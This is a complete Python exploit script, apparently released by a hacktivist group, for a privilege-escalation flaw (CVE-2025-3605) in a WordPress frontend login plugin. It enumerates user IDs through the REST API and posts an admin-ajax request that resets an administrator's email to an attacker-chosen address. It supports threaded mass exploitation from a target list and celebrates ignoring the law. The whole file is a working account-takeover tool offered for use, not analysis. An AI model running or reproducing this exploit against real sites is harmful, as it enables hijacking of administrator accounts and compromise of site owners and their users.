#ID: CVE-2025-3605

import requests
import argparse
import sys
import time
import os
from concurrent.futures import ThreadPoolExecutor, as_completed
import colorama
from colorama import Fore, Style, Back

colorama.init(autoreset=True)
requests.packages.urllib3.disable_warnings()

#banner
def banner():
    art = f"""
{Fore.CYAN + Style.BRIGHT}
===============================
            EXPLOIT
===============================
  
  {Fore.YELLOW}Frontend Login & Registration Plugin <= 1.0.7 Privilege Escalation
  {Fore.WHITE}Indian Cyber Force
    """
    print(art)

# Headers
def session():
    sess = requests.Session()
    sess.verify = False
    sess.headers.update({
        'User-Agent': "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
        'Accept': 'application/json, text/javascript, */*; q=0.01',
        'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
        'X-Requested-With': 'XMLHttpRequest'
    })
    return sess

def args():
    parser = argparse.ArgumentParser(
        description="Frontend Login & Registration Plugin Exploit",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog=f"""
{Fore.YELLOW}Usage:
  {Style.DIM}python3 exploit.py -t https://target.pk -u 1 -e admin@mail.com
  python3 exploit.py -f targets.txt -e admin@mail.com{Style.RESET_ALL}
        """
    )
    
    parser.add_argument("--target", "-t", help="Single target url")
    parser.add_argument("--file", "-f", help="File with multiple targets")
    parser.add_argument("--user", "-u", help="target user id (manual)")
    parser.add_argument("--email", "-e", default="bharatiyacyberforce@protonmail.com", help="New email address")
    parser.add_argument("--threads", "-T", type=int, default=3, help="Threads")
    
    arg = parser.parse_args()
    
    if not arg.target and not arg.file:
        print(f"{Fore.RED}[-] Provide target (-t) or target file (-f)")
        sys.exit(1)
        
    return arg


# exploit vector
def payload(uid, mail):
    return {
        'action': 'flrblocksusersettingsupdatehandle',
        'user_id': uid,
        'flr-blocks-email-update': mail
    }

#user enumurate
def user_enum(site):
    try:
        if not site.startswith(('http://', 'https://')):
            site = 'https://' + site
            
        sess = session()
        url = f"{site.rstrip('/')}/wp-json/wp/v2/users"
        resp = sess.get(url, timeout=8)
        
        if resp.status_code == 200:
            users = resp.json()
            if users:
                return users[0]['id']
        return '1'
    except:
        return '1'

def exploit(target, user_id, email):
    try:
        sess = session()
        
        if not target.startswith(('http://', 'https://')):
            target = 'https://' + target
            
        ajax_url = f"{target.rstrip('/')}/wp-admin/admin-ajax.php"
        data_payload = payload(user_id, email)
        
        response = sess.post(ajax_url, data=data_payload, timeout=15)
        return target, response
        
    except Exception as e:
        return target, None

def check(target, response):
    if response is None:
        return False
        
    if response.status_code == 200:
        response_text = response.text.strip()
        if response_text != "0" and "error" not in response_text.lower():
            return True
    return False

def load(filename):
    try:
        with open(filename, 'r') as f:
            targets = [line.strip() for line in f if line.strip()]
        print(f"{Fore.GREEN}[+] Loaded {len(targets)} targets from {filename}")
        return targets
    except FileNotFoundError:
        print(f"{Fore.RED}[-] File {filename} not found")
        return []
    except Exception as e:
        print(f"{Fore.RED}[-] Error reading file: {str(e)}")
        return []

def Single_Target():
    arg = args()
    banner()
        
    if not arg.user:
        print(f"{Fore.BLUE}[*] User Enumureting...")
        user_id = user_enum(arg.target)
        print(f"{Fore.GREEN}[+] Using user ID: {user_id}")
    else:
        user_id = arg.user
    
    print(f"{Fore.MAGENTA}[~] Target user: {user_id}")
    print(f"{Fore.MAGENTA}[~] New email: {arg.email}")
    
    target, response = exploit(arg.target, user_id, arg.email)
    is_exploited = check(target, response)
    
    if is_exploited:
        print(f"{Fore.GREEN}[+] {target}     Exploited")
    else:
        print(f"{Fore.RED}[-] {target}       Failed")

def Mass_Targets():
    arg = args()
    banner()
    
    targets = load(arg.file)
    if not targets:
        print(f"{Fore.RED}[-] No targets found")
        return
    
    print(f"{Fore.BLUE}[*] Starting Mass Exploitation")
    print(f"{Fore.BLUE}[*] Total targets: {len(targets)}")
    print(f"{Fore.BLUE}[*] Threads: {arg.threads}")
    
    if not arg.user:
        print(f"{Fore.BLUE}[*] Auto username enumerating....")
    else:
        print(f"{Fore.MAGENTA}[~] Target user: {arg.user}")
    
    print(f"{Fore.MAGENTA}[~] New email: {arg.email}")
    print()
    
    exploited_count = 0
    
    def ProcessingTargets(site):

        if not arg.user:
            user_id = user_enum(site)
        else:
            user_id = arg.user
        
        # exploiting
        target, response = exploit(site, user_id, arg.email)
        is_exploited = check(target, response)
        
        return target, is_exploited
    
    # process all targets
    with ThreadPoolExecutor(max_workers=arg.threads) as executor:
        future_to_site = {executor.submit(ProcessingTargets, site): site for site in targets}
        
        # process results
        for future in as_completed(future_to_site):
            original_site = future_to_site[future]
            
            try:
                target, is_exploited = future.result()
                
                if is_exploited:
                    print(f"{Fore.GREEN}[+] {target}         Exploited")
                    exploited_count += 1
                else:
                    print(f"{Fore.RED}[-] {target}         Failed")
                    
            except Exception as error:
                print(f"{Fore.RED}[-] {original_site} - ERROR: {str(error)}")
    
    print()
    print(f"{Fore.GREEN}[+] Exploit Completed")
    print(f"{Fore.GREEN}[+] Results: {exploited_count} Exploited out of {len(targets)} Targets")
    
    if exploited_count > 0:
        print(f"{Fore.YELLOW}[!] JUST EXPLOIT, FORGET THE LAW, FUCK THE ENEMY")

def main():
    try:
        arg = args()
        
        if arg.file:
            Mass_Targets()
        else:
            Single_Target()
            
    except KeyboardInterrupt:
        print()
        print(f"{Fore.YELLOW}[!] Interrupted by user")
    except Exception as e:
        print(f"{Fore.RED}[-] Error: {str(e)}")
        sys.exit(1)

if __name__ == "__main__":
    main()
